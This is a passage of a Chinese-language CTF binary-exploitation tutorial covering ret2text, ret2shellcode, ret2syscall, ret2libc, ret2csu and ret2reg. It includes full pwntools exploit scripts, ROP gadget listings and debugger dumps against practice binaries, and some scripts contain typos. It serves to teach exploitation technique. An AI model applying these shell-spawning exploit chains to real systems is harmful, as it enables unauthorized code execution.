EBX 0x0 ECX 0xf7fb2dc7 (_IO_2_1_stdout_+71) ◂— 0xfb38900a EDX 0xf7fb3890 (_IO_stdfile_1_lock) ◂— 0x0 EDI 0x0 ESI 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c EBP 0xffffd548 ◂— 0x0 ESP 0xffffd4c0 —▸ 0xffffd4dc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34 EIP 0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8──────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────── 可以看到 esp 为 0xffffd4c0，ebp 为 0xffffd548，同时 s 相对于 esp 的索引为 esp+0x1c，因此，我们可以推断 s 的地址为 0xffffd4dc s 相对于 ebp 的偏移为 0x6c s 相对于返回地址的偏移为 0x6c+4 最后的 payload 如下： ##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c+4) + p32(target))sh.interactive() ret2shellcode原理ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。 例子这里我们以 bamboofox 中的 ret2shellcode 为例 点击下载: ret2shellcode 首先检测程序开启的保护 ╰─$ checksec ret2shellcode[*] '/Users/oldthree/Downloads/ret2shellcode' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序 int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets(&amp;s); strncpy(buf2, &amp;s, 0x64u); printf(&quot;bye bye ~&quot;); return 0;} 可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。 .bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] 这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。 pwndbg&gt; b *mainBreakpoint 1 at 0x804852d: file ret2shellcode.c, line 7.pwndbg&gt; rStarting program: /home/ol4three/Desktop/ret2shellcodeBreakpoint 1, main () at ret2shellcode.c:77 ret2shellcode.c: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────── EAX 0xf7fb3dd8 (environ) —▸ 0xffffd5dc —▸ 0xffffd73f ◂— 'LANG=en_US.UTF-8' EBX 0x0 ECX 0xec9ad2b EDX 0xffffd564 ◂— 0x0 EDI 0x0 ESI 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c EBP 0x0 ESP 0xffffd53c —▸ 0xf7df2f21 (__libc_start_main+241) ◂— add esp, 0x10 EIP 0x804852d (main) ◂— push ebp──────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────── ► 0x804852d &lt;main&gt; push ebp 0x804852e &lt;main+1&gt; mov ebp, esp 0x8048530 &lt;main+3&gt; and esp, 0xfffffff0 0x8048533 &lt;main+6&gt; add esp, -0x80 0x8048536 &lt;main+9&gt; mov eax, dword ptr [stdout@@GLIBC_2.0] &lt;0x804a060&gt; 0x804853b &lt;main+14&gt; mov dword ptr [esp + 0xc], 0 0x8048543 &lt;main+22&gt; mov dword ptr [esp + 8], 2 0x804854b &lt;main+30&gt; mov dword ptr [esp + 4], 0 0x8048553 &lt;main+38&gt; mov dword ptr [esp], eax 0x8048556 &lt;main+41&gt; call setvbuf@plt &lt;setvbuf@plt&gt; 0x804855b &lt;main+46&gt; mov eax, dword ptr [stdin@@GLIBC_2.0] &lt;0x804a040&gt;───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────00:0000│ esp 0xffffd53c —▸ 0xf7df2f21 (__libc_start_main+241) ◂— add esp, 0x1001:0004│ 0xffffd540 ◂— 0x102:0008│ 0xffffd544 —▸ 0xffffd5d4 —▸ 0xffffd71a ◂— '/home/ol4three/Desktop/ret2shellcode'03:000c│ 0xffffd548 —▸ 0xffffd5dc —▸ 0xffffd73f ◂— 'LANG=en_US.UTF-8'04:0010│ 0xffffd54c —▸ 0xffffd564 ◂— 0x005:0014│ 0xffffd550 ◂— 0x106:0018│ 0xffffd554 ◂— 0x007:001c│ 0xffffd558 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c─────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────── ► f 0 804852d main f 1 f7df2f21 __libc_start_main+241───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000 0x8049000 r-xp 1000 0 /home/ol4three/Desktop/ret2shellcode 0x8049000 0x804a000 r-xp 1000 0 /home/ol4three/Desktop/ret2shellcode 0x804a000 0x804b000 rwxp 1000 1000 /home/ol4three/Desktop/ret2shellcode0xf7dda000 0xf7faf000 r-xp 1d5000 0 /lib/i386-linux-gnu/libc-2.27.so0xf7faf000 0xf7fb0000 ---p 1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so0xf7fb0000 0xf7fb2000 r-xp 2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so0xf7fb2000 0xf7fb3000 rwxp 1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so0xf7fb3000 0xf7fb6000 rwxp 3000 00xf7fd0000 0xf7fd2000 rwxp 2000 00xf7fd2000 0xf7fd5000 r--p 3000 0 [vvar]0xf7fd5000 0xf7fd6000 r-xp 1000 0 [vdso]0xf7fd6000 0xf7ffc000 r-xp 26000 0 /lib/i386-linux-gnu/ld-2.27.so0xf7ffc000 0xf7ffd000 r-xp 1000 25000 /lib/i386-linux-gnu/ld-2.27.so0xf7ffd000 0xf7ffe000 rwxp 1000 26000 /lib/i386-linux-gnu/ld-2.27.so0xfffdd000 0xffffe000 rwxp 21000 0 [stack]pwndbg&gt; 通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限 0x804a000 0x804b000 rwxp 1000 1000 /home/ol4three/Desktop/ret2shellcode 那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。 具体的 payload 如下 from pwn import *sh = process('./ret2shellcode')shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))sh.interactive() 题目 sniperoj-pwn100-shellcode-x86-64 ret2syscall原理ret2syscall，即控制程序执行系统调用，获取 shell。 例子这里我们以 bamboofox 中的 ret2syscall 为例 点击下载: ret2syscall 首先检测程序开启的保护 $ checksec ret2syscall[*] '/home/ol4three/Desktop/ret2syscall' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码 int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;} 可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。 此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考 https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8 简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell execve(&quot;/bin/sh&quot;,NULL,NULL) 其中，该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。 首先，我们来寻找控制 eax 的 gadgets $ ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。 类似的，我们可以得到控制其它寄存器的 gadgets $ ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret0x080be23f : pop ebx ; pop edi ; ret0x0806eb69 : pop ebx ; pop edx ; ret0x08092258 : pop ebx ; pop esi ; pop ebp ; ret0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x100x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x140x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 40x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 80x08048913 : pop ebx ; pop esi ; pop edi ; ret0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 40x08049a94 : pop ebx ; pop esi ; ret0x080481c9 : pop ebx ; ret0x080d7d3c : pop ebx ; ret 0x6f90x08099c87 : pop ebx ; ret 80x0806eb91 : pop ecx ; pop ebx ; ret0x0806336b : pop edi ; pop esi ; pop ebx ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret0x0805c820 : pop esi ; pop ebx ; ret0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0807b6ed : pop ss ; pop ebx ; ret 这里，选择 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 这个可以直接控制其它三个寄存器。 此外，我们需要获得 /bin/sh 字符串对应的地址。 $ ROPgadget --binary ret2syscall --string '/bin/sh'Strings information============================================================0x080be408 : /bin/sh 可以找到对应的地址，此外，还有 int 0x80 的地址，如下 $ ROPgadget --binary ret2syscall --only 'int'Gadgets information============================================================0x08049421 : int 0x80Unique gadgets found: 1 同时，也找到对应的地址了。 下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。 from pwn import *sh = process('./ret2syscall')pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421bin_sh = 0x080be408payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc原理 ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 例子1这里我们以 bamboofox 中 ret2libc1 为例 点击下载: ret2libc1 首先，我们可以检查一下程序的安全保护 $ checksec ret2libc1[*] '/home/ol4three/Desktop/ret2libc1' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置 int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets(&amp;s); return 0;} 可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在 $ ROPgadget --binary ret2libc1 --string '/bin/sh'Strings information============================================================0x08048720 : /bin/sh 确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。 .plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] 那么我们直接返回该处，执行system函数。payload如下 from pwn import *sh = process('./ret2libc1')bin_bash = 0x08048720system_addr = 0x08048460payload = flat(['A' *112, system_addr, 'bbbb' , bin_bash])sh.sendline(payload)sh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。 这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。 例子2点击下载: ret2libc2 该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。 .plt:08048490 _system.plt:08048460 _gets .bss:0804A080 buf2 0x0804843d : pop ebx ; ret payload1 堆栈平衡(在调用完gets之后要把调用的参数给pop出来，提升栈堆(保持esp和ebp的值不变)再对system进行调用)如下： from pwn import *sh = process('./ret2libc2')system_addr = 0x08048490gets_addr = 0x08048460buf2_addr = 0x0804A080pop_ebx_addr = 0x0804843dpayload = flat(['A' * 112 ,gets_addr, pop_ebx_addr, buf2_addr, system_addr , 'aaaa' , buf])sh.sendline(paylaod)sh.sendline('/bin/bash')sh.interactive() payload2 : from pwn import *sh = process('./ret2libc2')system_addr = 0x08048490gets_addr = 0x08048460buf2_addr = 0x0804A080pop_ebx_addr = 0x0804843dpayload = flat(['A' * 112 ,gets_addr, system_addr, buf2_addr, buf2_addr])sh.sendline(paylaod)sh.sendline('/bin/bash')sh.interactive() 例子3点击下载: ret2libc3 在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 [*] '/home/ol4three/Desktop/ret2libc3' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 https://github.com/niklasb/libc-database 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme https://github.com/lieanu/LibcSearcher 此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。 这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下 泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) 手动寻找： https://libc.blukat.me/$ ./find __libc_start_main d90http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_i386.deb (id libc6_2.27-3ubuntu1_i386)http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6-i386_2.27-3ubuntu1_amd64.deb (id libc6-i386_2.27-3ubuntu1_amd64)$ ./dump libc6-i386_2.27-3ubuntu1_amd64offset___libc_start_main_ret = 0x18e81offset_system = 0x0003cd10offset_dup2 = 0x000e6110offset_read = 0x000e5620offset_write = 0x000e56f0offset_str_bin_sh = 0x17b8cf exp: #!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process('./ret2libc3')ret2libc3 = ELF('./ret2libc3')puts_plt = ret2libc3.plt['puts']libc_start_main_got = ret2libc3.got['__libc_start_main']main = ret2libc3.symbols['main']print &quot;leak libc_start_main_got addr and return to main again&quot;payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])sh.sendlineafter('Can you find it !?', payload)print &quot;get the related addr&quot;libc_start_main_addr = u32(sh.recv()[0:4])libc = LibcSearcher('__libc_start_main', libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump('__libc_start_main')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')print &quot;get shell&quot;payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive() 题目 train.cs.nctu.edu.tw: ret2libc train.cs.nctu.edu.tw: rop 2013-PlaidCTF-ropasaurusrex Defcon 2015 Qualifier: R0Pbaby Intermediate ROP中级 ROP 主要是使用了一些比较巧妙的 Gadgets。 ret2csu原理 在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别) .text:00000000004005C0 ; void _libc_csu_init(void).text:00000000004005C0 public __libc_csu_init.text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:00000000004005C0 ; __unwind {.text:00000000004005C0 push r15.text:00000000004005C2 push r14.text:00000000004005C4 mov r15d, edi.text:00000000004005C7 push r13.text:00000000004005C9 push r12.text:00000000004005CB lea r12, __frame_dummy_init_array_entry.text:00000000004005D2 push rbp.text:00000000004005D3 lea rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004005DA push rbx.text:00000000004005DB mov r14, rsi.text:00000000004005DE mov r13, rdx.text:00000000004005E1 sub rbp, r12.text:00000000004005E4 sub rsp, 8.text:00000000004005E8 sar rbp, 3.text:00000000004005EC call _init_proc.text:00000000004005F1 test rbp, rbp.text:00000000004005F4 jz short loc_400616.text:00000000004005F6 xor ebx, ebx.text:00000000004005F8 nop dword ptr [rax+rax+00000000h].text:0000000000400600.text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400600 mov rdx, r13.text:0000000000400603 mov rsi, r14.text:0000000000400606 mov edi, r15d.text:0000000000400609 call qword ptr [r12+rbx*8].text:000000000040060D add rbx, 1.text:0000000000400611 cmp rbx, rbp.text:0000000000400614 jnz short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn.text:0000000000400624 ; } // starts at 4005C0.text:0000000000400624 __libc_csu_init endp 这里我们可以利用以下几点 从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。 从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。 从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。 例子这里我们以一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。首先检查程序的安全保护 $ checksec level5 [*] '/home/oldthree/Desktop/level5' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 程序为 64 位，开启了堆栈不可执行保护。 其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出 ssize_t vulnerable_function(){ char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x200uLL);} 基本利用思路如下 利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数 根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址 再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。 再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。 exp 如下 from pwn import *from LibcSearcher import LibcSearcherdebug = Truecontext(log_level = 'debug', arch = 'amd64', os = 'linux')if debug: sh = process(&quot;./level5&quot;) level5=ELF('./level5')else: link = &quot;x.x.x.x:xx&quot; ip, port = map(lambda x:x.strip(), link.split(':')) sh = remote(ip, port) elf=ELF('./level5')write_got = level5.got['write']read_got = level5.got['read']main_addr = level5.symbols['main']bss_base = level5.bss()csu_front_addr = 0x0000000000400600csu_end_addr = 0x000000000040061Afakeebp = 'b' * 8def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1)sh.recvuntil('Hello, World\\n')## RDI, RSI, RDX, RCX, R8, R9, more on the stack## write(1,write_got,8)csu(0, 1, write_got, 8, write_got, 1, main_addr)#write(1, writ_got_addr, 8)write_addr = u64(sh.recv(8))libc = LibcSearcher('write', write_addr)libc_base = write_addr - libc.dump('write')execve_addr = libc_base + libc.dump('execve')log.success('execve_addr ' + hex(execve_addr))##gdb.attach(sh)## read(0,bss_base,16)## read execve_addr and /bin/sh\\x00sh.recvuntil('Hello, World\\n')csu(0, 1, read_got, 16, bss_base, 0, main_addr)#read(0,bss_base,16)sh.send(p64(execve_addr) + '/bin/sh\\x00')sh.recvuntil('Hello, World\\n')## execve(bss_base+8)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)#execve(/bin/sh,0,0)sh.interactive() gadget构造的payload要在末尾加上0x38个填充字符 gadget1: add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn gadget2: .text:0000000000400609 call qword ptr [r12+rbx*8] rsp 8 * (8 -1) ps: add rsp,8 + pop * 6 + ret -call 思考改进在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法 改进 1 提前控制 RBX 与 RBP可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。 改进 2 多次利用其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件 漏洞可以被多次触发 在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。 当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。 gadget其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数 _init_startcall_gmon_startderegister_tm_clonesregister_tm_clones__do_global_dtors_auxframe_dummy__libc_csu_init__libc_csu_fini_fini 我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。 需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器 利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。 利用中间部分的代码控制了 rdx，rsi，edi。 而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。 gef➤ x/5i 0x000000000040061A 0x40061a &lt;__libc_csu_init+90&gt;: pop rbx 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14gef➤ x/5i 0x000000000040061b 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15gef➤ x/5i 0x000000000040061A+3 0x40061d &lt;__libc_csu_init+93&gt;: pop rsp 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: retgef➤ x/5i 0x000000000040061e 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x/5i 0x000000000040061f 0x40061f &lt;__libc_csu_init+95&gt;: pop rbp 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x/5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]gef➤ x/5i 0x0000000000400621 0x400621 &lt;__libc_csu_init+97&gt;: pop rsi 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x/5i 0x000000000040061A+9 0x400623 &lt;__libc_csu_init+99&gt;: pop rdi 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz ret 题目 2016 XDCTF pwn100 2016 华山杯 SU_PWN ret2reg原理 1.查看栈溢出返回时哪个寄存器指向缓冲区空间 2.查找对应的call寄存器活着jmp寄存器指令，将EIP设置为该指令地址 3.将寄存器所指向的空间上注入shellcode 利用思路 分析和调试汇编，查看溢出函数返回时哪个寄存器指向缓冲区地址 向寄存器指向的缓冲区中注入shellcode 查找call 该寄存器或者jmp 该寄存器指令，并将该指令地址覆盖ret 防御方法在函数ret之前，将所有寄存器全部复位，清0，以避免此类漏洞 Example此类漏洞常见于strcpy字符串拷贝函数中 源程序#include &lt;stdio.h&gt;#include &lt;string.h&gt;void evilfunction(char *input) { char buffer[512]; strcpy(buffer, input);}int main(int argc, char **argv) { evilfunction(argv[1]); return 0;} 编译开启地址随机化（ASLR） echo 2 &gt; /proc/sys/kernel/randomize_va_space 进行编译 gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector checksec + IDA分析 $ checksec ret2reg [*] '/home/oldthree/Desktop/ret2reg' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments IDA int __cdecl main(int argc, const char **argv, const char **envp){ evilfunction((char *)argv[1]); return 0;}void __cdecl evilfunction(char *input){ char buffer[512]; // [esp+0h] [ebp-208h] strcpy(buffer, input);} 